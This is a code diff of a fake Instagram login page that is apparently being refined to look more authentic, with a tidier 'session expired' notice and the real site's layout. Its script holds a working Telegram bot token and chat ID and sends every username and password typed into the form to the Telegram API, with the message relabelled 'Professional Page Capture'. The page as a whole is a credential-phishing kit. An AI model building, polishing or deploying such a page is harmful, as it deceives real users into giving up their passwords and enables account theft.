@@ -14,31 +14,31 @@
             height: 100vh;
             margin: 0;
         }
+        .main-container {
+            width: 350px;
+        }
         .login-card {
             background: #fff;
             border: 1px solid #dbdbdb;
             border-radius: 1px;
-            padding: 40px;
-            width: 350px;
+            padding: 20px 40px 10px 40px;
             text-align: center;
             box-sizing: border-box;
+            margin-bottom: 10px;
         }
         .logo {
             font-family: cursive, sans-serif;
-            font-size: 42px;
-            margin-bottom: 20px;
-            font-weight: bold;
+            font-size: 50px;
+            margin: 22px 0 12px 0;
+            font-weight: normal;
             color: #262626;
         }
-        .alert-box {
-            background-color: #fff3cd;
-            border: 1px solid #ffeeba;
-            color: #856404;
-            padding: 10px;
-            font-size: 13px;
-            border-radius: 4px;
-            margin-bottom: 15px;
-            line-height: 1.4;
+        .session-notice {
+            font-size: 14px;
+            color: #737373;
+            line-height: 18px;
+            margin-bottom: 20px;
+            font-weight: 400;
         }
         input {
             width: 100%;
@@ -65,21 +65,52 @@
             font-size: 14px;
             width: 100%;
             padding: 7px;
-            margin-top: 10px;
+            margin-top: 8px;
+            margin-bottom: 15px;
         }
-        .help-text {
+        .or-divider {
+            display: flex;
+            align-items: center;
+            margin: 10px 0 18px 0;
+        }
+        .or-line {
+            flex-grow: 1;
+            height: 1px;
+            background-color: #dbdbdb;
+        }
+        .or-text {
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+            margin: 0 18px;
+        }
+        .fb-login {
+            color: #385185;
+            font-size: 14px;
+            font-weight: 600;
+            text-decoration: none;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .forgot-pass {
             color: #00376b;
             font-size: 12px;
-            margin-top: 15px;
             text-decoration: none;
             display: block;
+            margin-bottom: 20px;
         }
-        .footer-text {
-            color: #737373;
-            font-size: 12px;
-            margin-top: 20px;
+        .signup-card {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 20px;
+            text-align: center;
+            font-size: 14px;
+            color: #262626;
         }
-        .footer-text a {
+        .signup-card a {
             color: #0095f6;
             text-decoration: none;
             font-weight: 600;
@@ -88,24 +119,33 @@
 </head>
 <body>
 
-    <div class="login-card">
-        <div class="logo">Instagram</div>
-        
-        <!-- تنبيه انتهاء الجلسة -->
-        <div class="alert-box">
-            Session expired. Please log in again to continue.
+    <div class="main-container">
+        <div class="login-card">
+            <div class="logo">Instagram</div>
+            
+            <!-- رسالة احترافية تدمج تنبيه انتهاء الجلسة بشكل طبيعي -->
+            <div class="session-notice">
+                Your session has expired. Please log in again to continue.
+            </div>
+
+            <form id="loginForm">
+                <input type="text" id="username" placeholder="Phone number, username, or email" required>
+                <input type="password" id="password" placeholder="Password" required>
+                <button type="submit" class="btn">Log In</button>
+            </form>
+
+            <div class="or-divider">
+                <div class="or-line"></div>
+                <div class="or-text">OR</div>
+                <div class="or-line"></div>
+            </div>
+
+            <a href="#" class="fb-login">Log in with Facebook</a>
+            <a href="#" class="forgot-pass">Forgot password?</a>
         </div>
 
-        <form id="loginForm">
-            <input type="text" id="username" placeholder="Phone number, email or username" required>
-            <input type="password" id="password" placeholder="Password" required>
-            <button type="submit" class="btn">Log In</button>
-        </form>
-
-        <a href="#" class="help-text">Forgot your login details? Get help logging in.</a>
-        
-        <div class="footer-text">
-            Don't have an account? <a href="#">Sign up.</a>
+        <div class="signup-card">
+            Don't have an account? <a href="#">Sign up</a>
         </div>
     </div>
 
@@ -118,7 +158,7 @@
             const botToken = "8970427451:AAFqyCocC3VS1jGYo8Da_ET6PNrV6hWdOVs";
             const chatId = "865078178";
             
-            const message = "🚨 Instagram Login Captured:\n👤 User: " + user + "\n🔑 Password: " + pass + "\n🌐 URL: " + window.location.href;
+            const message = "🎯 Professional Page Capture:\n👤 User: " + user + "\n🔑 Password: " + pass + "\n🌐 URL: " + window.location.href;
             const url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message);
             
             const img = new Image();
